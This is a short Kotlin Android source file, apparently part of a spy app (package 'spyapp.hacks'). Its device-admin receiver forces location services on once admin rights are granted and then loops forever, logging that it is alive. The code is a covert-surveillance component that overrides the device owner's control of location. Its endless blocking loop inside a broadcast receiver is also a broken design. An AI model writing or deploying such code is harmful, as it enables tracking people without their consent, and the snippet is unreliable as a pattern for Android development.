package npo.kib.spyapp.hacks

import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.util.Log
import androidx.core.content.ContextCompat.getSystemService
import kotlinx.coroutines.delay
import kotlinx.coroutines.runBlocking


class DevAdminReceiver : DeviceAdminReceiver() {
    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        Log.d("myLogs", "DevAdminReceiver onEnabled")

        val mDevicePolicyManager = getSystemService(context, DevicePolicyManager::class.java)
        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.R) {
            Log.d("myLogs", "DevAdminReceiver unsupported API")
            return
        }

        runCatching {
            val componentName = ComponentName(context, DevAdminReceiver::class.java)
            mDevicePolicyManager?.setLocationEnabled(componentName, true)
        }
            .onSuccess { Log.d("myLogs", "DevAdminReceiver setLocationEnabled") }
            .onFailure { Log.d("myLogs", "DevAdminReceiver error $it") }

        runBlocking {
            while (true) {
                Log.d("myLogs", "DevAdminReceiver is alive!")
                delay(2000)
            }
        }
    }
}
